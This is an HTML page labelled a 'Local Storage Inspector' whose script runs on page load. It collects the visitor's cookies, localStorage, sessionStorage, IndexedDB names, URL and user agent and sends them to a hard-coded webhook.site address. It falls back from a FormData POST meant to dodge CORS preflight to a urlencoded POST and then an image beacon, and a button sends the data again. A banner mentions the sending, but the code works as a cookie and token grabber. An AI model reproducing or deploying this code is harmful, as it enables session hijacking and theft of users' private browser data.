<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Local Storage Inspector</title>
  <style>
    body { font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif; padding: 16px; }
    pre { background:#f6f8fa; padding:12px; border-radius:6px; overflow:auto; max-height:40vh }
    button { margin:6px 0; padding:8px 12px; border-radius:6px; }
    .warning { background: #fff3cd; border: 1px solid #ffeaa7; padding: 12px; border-radius: 6px; margin: 12px 0; }
    .status { background: #d1ecf1; border: 1px solid #bee5eb; padding: 12px; border-radius: 6px; margin: 12px 0; }
  </style>
</head>
<body>
  <div class="warning">
    <strong>Warning:</strong> This version automatically sends data to an external webhook on page load.
  </div>
  
  <h1>Local Storage Inspector</h1>
  <p>This page automatically reads and sends cookies, localStorage, sessionStorage and IndexedDB info to webhook.</p>

  <div id="status" class="status">Collecting and sending data...</div>
  <button id="downloadBtn">Download JSON</button>
  <button id="sendAgainBtn">Send Again</button>
  <pre id="output">Loading...</pre>

<script>
const WEBHOOK_URL = 'https://webhook.site/d0cfa850-4cfd-4b43-8de0-af4fb3f51c86';

async function readIndexedDBInfo() {
  const info = {};
  if (indexedDB && indexedDB.databases) {
    try {
      const dbs = await indexedDB.databases();
      info.databases = dbs.map(d => ({ name: d.name, version: d.version }));
    } catch (e) {
      info.databases = { error: 'indexedDB.databases() failed: ' + e.message };
    }
  } else {
    info.databases = { note: 'indexedDB.databases() not supported in this browser' };
  }
  return info;
}

function readCookies() {
  const raw = document.cookie || '';
  const obj = {};
  if (!raw) return obj;
  raw.split(';').forEach(pair => {
    const [k, ...rest] = pair.trim().split('=');
    obj[decodeURIComponent(k)] = decodeURIComponent(rest.join('=') || '');
  });
  return obj;
}

function readStorage(storage) {
  const o = {};
  for (let i=0;i<storage.length;i++) {
    const k = storage.key(i);
    try {
      o[k] = storage.getItem(k);
    } catch(e) {
      o[k] = `ERROR: ${e.message}`;
    }
  }
  return o;
}

async function inspectAll() {
  const result = {
    timestamp: new Date().toISOString(),
    location: window.location.href,
    userAgent: navigator.userAgent,
    cookies: readCookies(),
    localStorage: readStorage(localStorage),
    sessionStorage: readStorage(sessionStorage),
    indexedDB: await readIndexedDBInfo()
  };
  return result;
}

function pretty(obj) {
  return JSON.stringify(obj, null, 2);
}

async function sendToWebhook(data) {
  try {
    // Use FormData to avoid CORS preflight
    const formData = new FormData();
    formData.append('data', JSON.stringify(data));
    
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      body: formData // No custom headers to avoid preflight
    });
    
    return {
      success: response.ok,
      status: response.status,
      statusText: response.statusText
    };
  } catch (err) {
    return {
      success: false,
      error: err.message
    };
  }
}

// Alternative method using URL encoded form
async function sendToWebhookAlt(data) {
  try {
    const response = await fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: 'data=' + encodeURIComponent(JSON.stringify(data))
    });
    
    return {
      success: response.ok,
      status: response.status,
      statusText: response.statusText
    };
  } catch (err) {
    return {
      success: false,
      error: err.message
    };
  }
}

// Method using image beacon (no response handling)
function sendToWebhookBeacon(data) {
  const url = WEBHOOK_URL + '?data=' + encodeURIComponent(JSON.stringify(data));
  const img = new Image();
  img.src = url;
  return { success: true, method: 'beacon' };
}

// Auto-execute on page load
(async function() {
  try {
    const data = await inspectAll();
    window.__LAST_LOCAL_DUMP__ = data;
    
    // Update UI immediately with collected data
    document.getElementById('output').textContent = pretty(data);
    document.getElementById('status').textContent = 'Data collected. Sending to webhook...';
    
    // Try multiple methods to send data
    let sendResult = await sendToWebhook(data);
    
    // If first method fails, try alternative
    if (!sendResult.success) {
      console.log('First method failed, trying alternative...');
      sendResult = await sendToWebhookAlt(data);
    }
    
    // If still fails, use beacon method
    if (!sendResult.success) {
      console.log('Alternative method failed, using beacon...');
      sendResult = sendToWebhookBeacon(data);
    }
    
    // Update UI with results
    if (sendResult.success) {
      document.getElementById('status').textContent = '✓ Data successfully collected and sent to webhook!';
      document.getElementById('status').style.background = '#d4edda';
      document.getElementById('status').style.borderColor = '#c3e6cb';
      document.getElementById('status').style.color = '#155724';
    } else {
      document.getElementById('status').textContent = '✗ Data collected but failed to send to webhook: ' + 
        (sendResult.error || `HTTP ${sendResult.status}`);
      document.getElementById('status').style.background = '#f8d7da';
      document.getElementById('status').style.borderColor = '#f5c6cb';
      document.getElementById('status').style.color = '#721c24';
    }
    
    // Log to console
    console.log('Auto-collected storage dump:', data);
    console.log('Webhook send result:', sendResult);
    
  } catch (err) {
    document.getElementById('status').textContent = 'Error collecting data: ' + err.message;
    document.getElementById('output').textContent = 'Error: ' + err.message;
  }
})();

// Manual download button
document.getElementById('downloadBtn').addEventListener('click', () => {
  const data = window.__LAST_LOCAL_DUMP__;
  if (!data) {
    alert('No data to download yet.');
    return;
  }
  const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = 'storage-dump-' + (new Date().toISOString()).replace(/[:.]/g,'-') + '.json';
  document.body.appendChild(a);
  a.click();
  a.remove();
  URL.revokeObjectURL(url);
});

// Manual send again button
document.getElementById('sendAgainBtn').addEventListener('click', async () => {
  const data = window.__LAST_LOCAL_DUMP__;
  if (!data) {
    alert('No data to send.');
    return;
  }
  
  document.getElementById('status').textContent = 'Sending data again...';
  document.getElementById('status').style.background = '#d1ecf1';
  document.getElementById('status').style.borderColor = '#bee5eb';
  document.getElementById('status').style.color = '#0c5460';
  
  let sendResult = await sendToWebhook(data);
  
  if (!sendResult.success) {
    sendResult = await sendToWebhookAlt(data);
  }
  
  if (!sendResult.success) {
    sendResult = sendToWebhookBeacon(data);
  }
  
  if (sendResult.success) {
    document.getElementById('status').textContent = '✓ Data successfully sent to webhook again!';
    document.getElementById('status').style.background = '#d4edda';
    document.getElementById('status').style.borderColor = '#c3e6cb';
    document.getElementById('status').style.color = '#155724';
  } else {
    document.getElementById('status').textContent = '✗ Failed to send to webhook: ' + 
      (sendResult.error || `HTTP ${sendResult.status}`);
    document.getElementById('status').style.background = '#f8d7da';
    document.getElementById('status').style.borderColor = '#f5c6cb';
    document.getElementById('status').style.color = '#721c24';
  }
});
</script>
</body>
</html>
